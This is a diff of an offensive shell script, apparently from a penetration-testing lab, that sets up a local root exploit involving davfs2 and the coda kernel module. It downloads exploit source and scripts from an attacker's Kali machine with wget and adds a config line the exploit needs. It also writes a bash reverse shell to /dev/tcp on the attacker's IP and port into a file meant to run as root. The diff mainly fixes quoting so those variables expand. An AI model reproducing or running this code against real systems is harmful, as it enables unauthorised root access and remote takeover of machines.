@@ -12,7 +12,7 @@
 user='davtest'
 # Change kali settings for reverse shell
 ip='192.168.119.187'
-port='6969'
+port='4446'
 srvip='8000'
 
 # Change to the users home directory
@@ -22,16 +22,16 @@ wget http://$ip:$srvip/coda.c -O coda.c -q
 wget http://$ip:$srvip/Makefile -O Makefile -q
 wget http://$ip:$srvip/exploit.sh -O exploit.sh -q
 # Upgrades the shell (can be omitted if yoou have upgraded it some other way)
-python -c 'import pty; pty.spawn("/bin/bash")'
+# python -c 'import pty; pty.spawn("/bin/bash")'
 # To create a reverse shell to your kali
-echo '#!/usr/bin/env bash' > /home/$user/rootprog
-echo 'bash -i >& /dev/tcp/$ip/$port 0>&1' >> /home/$user/rootprog
+echo "#!/usr/bin/env bash" > /home/$user/rootprog
+echo "bash -i >& /dev/tcp/$ip/$port 0>&1" >> /home/$user/rootprog
 # Adds 'kernel_fs' to davfs2.conf file which is required for the exploit to work
 echo 'kernel_fs       coda' >> .davfs2/davfs2.conf
 
 echo 'Run the following to get root:'
-echo 'chmod +x /home/$user/rootprog'
-echo 'chmod +x exploit.sh'
-echo './exploit.sh'
+echo "chmod +x /home/$user/rootprog"
+echo "chmod +x exploit.sh"
+echo "./exploit.sh"
 echo '*For exploit.sh, just press enter for whatever the program asks of you'
 echo 'Hope ya get r00t!'
